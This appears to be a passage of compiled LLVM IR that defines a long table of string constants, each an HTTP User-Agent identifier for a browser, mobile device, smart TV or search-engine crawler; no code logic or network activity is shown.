@.str.109 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.110 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.111 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.112 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.113 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.114 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.115 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.116 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.117 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.118 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.119 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.120 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00", align 1
@.str.121 = private unnamed_addr constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.122 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.123 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00", align 1
@.str.124 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.125 = private unnamed_addr constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00", align 1
@.str.126 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.127 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00", align 1
@.str.128 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.129 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.130 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00", align 1
@.str.131 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00", align 1
@.str.132 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.133 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.134 = private unnamed_addr constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.135 = private unnamed_addr constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.136 = private unnamed_addr constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.137 = private unnamed_addr constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.138 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.139 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00", align 1
@.str.140 = private unnamed_addr constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00", align 1
@.str.141 = private unnamed_addr constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00", align 1
@.str.142 = private unnamed_addr constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00", align 1
@.str.143 = private unnamed_addr constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00", align 1
@.str.144 = private unnamed_addr constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00", align 1
@.str.145 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.146 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00", align 1
@.str.147 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.148 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.149 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.150 = private unnamed_addr constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00", align 1
@.str.151 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.152 = private unnamed_addr constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00", align 1
@.str.153 = private unnamed_addr constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00", align 1
@.str.154 = private unnamed_addr constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00", align 1
@.str.155 = private unnamed_addr constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00", align 1
@.str.156 = private unnamed_addr constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00", align 1
@.str.157 = private unnamed_addr constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00", align 1
@.str.158 = private unnamed_addr constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.159 = private unnamed_addr constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00", align 1
@.str.160 = private unnamed_addr constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00", align 1
@.str.161 = private unnamed_addr constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00", align 1
@.str.162 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00", align 1
@.str.163 = private unnamed_addr constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00", align 1
@.str.164 = private unnamed_addr constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00", align 1
@.str.165 = private unnamed_addr constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00", align 1
@.str.166 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00", align 1
@.str.167 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00", align 1
@.str.168 = private unnamed_addr constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00", align 1
@.str.169 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00", align 1
@.str.170 = private unnamed_addr constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00", align 1
@.str.171 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00", align 1
@.str.172 = private unnamed_addr constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00", align 1
@.str.173 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00", align 1
@.str.174 = private unnamed_addr constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00", align 1
@.str.175 = private unnamed_addr constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00", align 1
@.str.176 = private unnamed_addr constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00", align 1
@.str.177 = private unnamed_addr constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00", align 1
@.str.178 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00", align 1
@.str.179 = private unnamed_addr constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00", align 1
@.str.180 = private unnamed_addr constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00", align 1
@.str.181 = private unnamed_addr constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00", align 1
@.str.182 = private unnamed_addr constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00", align 1
@.str.183 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.184 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00", align 1
@.str.185 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.186 = private unnamed_addr constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00", align 1
@.str.187 = private unnamed_addr constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00", align 1
@.str.188 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00", align 1
@.str.189 = private unnamed_addr constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00", align 1
@.str.190 = private unnamed_addr constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00", align 1
@.str.191 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00", align 1
@.str.192 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.193 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00", align 1
@.str.194 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00", align 1
@.str.195 = private unnamed_addr constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00", align 1
@.str.196 = private unnamed_addr constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00", align 1
@.str.197 = private unnamed_addr constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00", align 1
@.str.198 = private unnamed_addr constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00", align 1
@.str.199 = private unnamed_addr constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00", align 1
@.str.200 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00", align 1
@.str.201 = private unnamed_addr constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.202 = private unnamed_addr constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.203 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.204 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.205 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.206 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.207 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.208 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.209 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.210 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.211 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.212 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.213 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.214 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.215 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.216 = private unnamed_addr constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.217 = private unnamed_addr constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00", align 1
@.str.218 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.219 = private unnamed_addr constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.220 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.221 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.222 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00", align 1
@.str.223 = private unnamed_addr constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00", align 1
@.str.224 = private unnamed_addr constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00", align 1
@.str.225 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00", align 1
@.str.226 = private unnamed_addr constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00", align 1
@.str.227 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.228 = private unnamed_addr constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00", align 1
@.str.229 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.230 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.231 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.232 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00", align 1
@.str.233 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.234 = private unnamed_addr constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00", align 1
@.str.235 = private unnamed_addr constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00", align 1
@.str.236 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.237 = private unnamed_addr constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.238 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.239 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00", align 1
@.str.240 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.241 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.242 = private unnamed_addr constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00", align 1
@.str.243 = private unnamed_addr constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.244 = private unnamed_addr constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00", align 1
@.str.245 = private unnamed_addr constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.246 = private unnamed_addr constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00", align 1
@.str.247 = private unnamed_addr constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00", align 1
@.str.248 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.249 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00", align 1
@.str.250 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00", align 1
@.str.251 = private unnamed_addr constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00", align 1
@.str.252 = private unnamed_addr constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00", align 1
@.str.253 = private unnamed_addr constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00", align 1
@.str.254 = private unnamed_addr constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00", align 1
@.str.255 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00", align 1
@.str.256 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00", align 1
@.str.257 = private unnamed_addr constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00", align 1
@.str.258 = private unnamed_addr constant [19 x i8] c"C4PC UserAgent/0.7\00", align 1
@.str.259 = private unnamed_addr constant [19 x i8] c"Googlebot 1.01.003\00", align 1
@.str.260 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00", align 1
@.str.261 = private unnamed_addr constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00", align 1
@.str.262 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00", align 1
@.str.263 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00", align 1
@.str.264 = private unnamed_addr constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.265 = private unnamed_addr constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00", align 1
@.str.266 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00", align 1
@.str.267 = private unnamed_addr constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00", align 1
@.str.268 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.269 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00", align 1
@.str.270 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00", align 1
@.str.271 = private unnamed_addr constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00", align 1
@.str.272 = private unnamed_addr constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00", align 1
@.str.273 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00", align 1
